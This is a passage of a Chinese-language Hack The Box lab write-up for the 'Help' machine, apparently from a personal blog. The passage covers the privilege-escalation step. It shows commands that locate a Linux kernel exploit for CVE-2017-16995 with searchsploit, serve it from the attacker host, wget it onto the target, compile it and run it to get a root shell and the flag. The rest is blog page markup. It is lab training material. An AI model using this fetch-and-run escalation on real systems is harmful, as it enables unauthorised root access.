+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>@<span class="built_in">help</span>:/$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux <span class="built_in">help</span> 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+
+<p>查到exp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root@kali)-[/home/h4m5t/Desktop/HTB/Help]</span><br><span class="line">└─<span class="comment"># searchsploit &quot;4.4.0-116&quot;</span></span><br><span class="line">--------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                           |  Path</span><br><span class="line">--------------------------------------------------------- ---------------------------------</span><br><span class="line">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privil | linux/local/44298.c</span><br><span class="line">--------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">                                                                                   </span><br><span class="line">┌──(root@kali)-[/home/h4m5t/Desktop/HTB/Help]</span><br><span class="line">└─<span class="comment"># searchsploit -m linux/local/44298.c </span></span><br><span class="line">  Exploit: Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/44298</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/linux/local/44298.c</span><br><span class="line">    Codes: CVE-2017-16995</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: C <span class="built_in">source</span>, ASCII text</span><br><span class="line">Copied to: /home/h4m5t/Desktop/HTB/Help/44298.c</span><br></pre></td></tr></table></figure>
+
+<p>在kali启动http.server</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure>
+
+<p>在靶机wget下载文件并编译：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>@<span class="built_in">help</span>:/tmp$ wget http://10.10.14.9:8000/44298.c</span><br><span class="line"><span class="built_in">help</span>@<span class="built_in">help</span>:/tmp$ gcc 44298.c -o 44298</span><br></pre></td></tr></table></figure>
+
+<p>运行，提权成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>@<span class="built_in">help</span>:/tmp$ ./44298 </span><br><span class="line">task_struct = ffff88003b502a00</span><br><span class="line">uidptr = ffff880037300784</span><br><span class="line">spawning root shell</span><br><span class="line">root@<span class="built_in">help</span>:/tmp<span class="comment"># cat /root/root.txt </span></span><br><span class="line">e0226c44b138c223f11148228acb9517</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=axxCpCTmu_k">https://www.youtube.com/watch?v=axxCpCTmu_k</a></p>
+<p><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2019/06/08/htb-help.html#">https://0xdf.gitlab.io/2019/06/08/htb-help.html#</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://h4m5t.github.io">h4m5t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://h4m5t.github.io/2024/09/18/HTB_Help/">http://h4m5t.github.io/2024/09/18/HTB_Help/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://h4m5t.github.io" target="_blank">h4m5t's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post_share"><div class="social-share" data-image="/img/HTB.png" data-sites="wechat,qq,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/26/Tmux/" title="Tmux"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://tt3.pages.dev/img/de/de_1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Tmux</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/15/HTB_Bizness/" title="HTB_Bizness"><img class="cover" src= "/img/loading.gif" data-lazy-src="/img/HTB.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTB_Bizness</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/09/11/HTB_MetaTwo/" title="HTB_MetaTwo"><img class="cover" src= "/img/loading.gif" data-lazy-src="/img/HTB.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-11</div><div class="title">HTB_MetaTwo</div></div></a></div><div><a href="/2024/09/15/HTB_Bizness/" title="HTB_Bizness"><img class="cover" src= "/img/loading.gif" data-lazy-src="/img/HTB.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-15</div><div class="title">HTB_Bizness</div></div></a></div><div><a href="/2024/09/29/HTB_Rental/" title="HTB_Rental"><img class="cover" src= "/img/loading.gif" data-lazy-src="/img/HTB.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-29</div><div class="title">HTB_Rental</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h4m5t</div><div class="author-info__description">人生得意需尽欢</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">87</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h4m5t"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h4m5t" target="_blank" title="GitHub"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.linkedin.com/in/yuduo-ding-943824202" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a><a class="social-icon" href="https://twitter.com/h4m5t" target="_blank" title="Twitter"><i class="fab fa-x-twitter"></i></a><a class="social-icon" href="https://www.zhihu.com/people/h4m5t" target="_blank" title="ZhiHu"><i class="fab fa-zhihu"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome! <br> 安全技术交流群753267126 <br> 网安考研交流群244768497 <br></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A8%B3%E5%AE%9Ashell"><span class="toc-number">3.</span> <span class="toc-text">稳定shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/15/buffer-overflow/" title="Buffer Overflow Attack">Buffer Overflow Attack</a><time datetime="2024-10-15T15:55:23.000Z" title="发表于 2024-10-15 23:55:23">2024-10-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/13/Telstra-Cybersecurity/" title="Telstra_Cybersecurity">Telstra_Cybersecurity</a><time datetime="2024-10-13T09:23:23.000Z" title="发表于 2024-10-13 17:23:23">2024-10-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/12/apps/" title="移动应用的静态动态分析">移动应用的静态动态分析</a><time datetime="2024-10-12T12:03:10.000Z" title="发表于 2024-10-12 20:03:10">2024-10-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/07/USYD-CTF/" title="USYD_CTF">USYD_CTF</a><time datetime="2024-10-07T16:35:10.000Z" title="发表于 2024-10-08 00:35:10">2024-10-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/30/HTB-Invalidated/" title="HTB_Invalidated">HTB_Invalidated</a><time datetime="2024-09-30T06:00:01.000Z" title="发表于 2024-09-30 14:00:01">2024-09-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/HTB.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By h4m5t</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addGlobalFn('themeChange', runMermaid, 'mermaid')
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
